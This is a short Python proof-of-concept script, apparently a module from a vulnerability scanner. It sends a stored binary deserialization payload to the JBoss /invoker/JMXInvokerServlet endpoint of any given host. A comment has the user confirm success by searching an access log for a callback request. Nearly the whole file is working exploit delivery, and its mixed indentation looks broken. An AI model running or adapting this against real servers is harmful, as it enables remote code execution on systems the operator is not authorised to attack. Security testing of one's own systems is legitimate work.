#!/usr/bin/python
#coding=utf8

import requests
import sys 
import os
import urlparse
from ext.ParseUrl import ParseUrl

'''
you can verify through access.log, command like this:
cat access.* | awk '{if ($7~/wolegecajboss.txt/) print $1}' | uniq | sort
'''
ppath = os.path.dirname(os.path.realpath(__file__)) + os.sep + 'static' + os.sep + 'jboss_poc.bin'

def verify(host):
    parse = ParseUrl()
    if parse.judgeIP(host):
        #jboss default port
        # port = 8080
        port = 80
    else:
        host, port = parse.parse(host)
    payloadObj = open(ppath,'rb').read()
    URL = "http://"+host+":"+str(port)+"/invoker/JMXInvokerServlet"
    try:
    	requests.post(URL, data=payloadObj, timeout=10)
    	msg = 'may vul, check access.log'
        return False, URL, msg
    except Exception, e:
        msg = str(e)
        return False, URL, msg
